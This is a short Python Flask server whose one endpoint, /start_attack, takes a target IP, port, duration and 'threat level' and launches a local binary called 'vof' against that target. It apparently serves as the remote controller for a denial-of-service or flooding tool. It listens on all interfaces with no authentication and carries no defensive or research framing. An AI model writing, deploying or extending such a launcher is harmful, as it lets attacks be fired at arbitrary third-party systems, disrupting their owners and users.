from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route('/start_attack', methods=['POST'])
def start_attack():
    try:
        target_ip = request.json.get('ip')
        target_port = request.json.get('port')
        attack_time = request.json.get('time', 300)  # Default to 300 seconds
        threat_level = request.json.get('threat', 50)  # Default threat level is 50

        # Run the binary with the parameters
        process = subprocess.Popen(
            ["./vof", target_ip, str(target_port), str(attack_time), str(threat_level)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        return jsonify({"message": f"Attack started on {target_ip}:{target_port} for {attack_time} seconds"}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
  
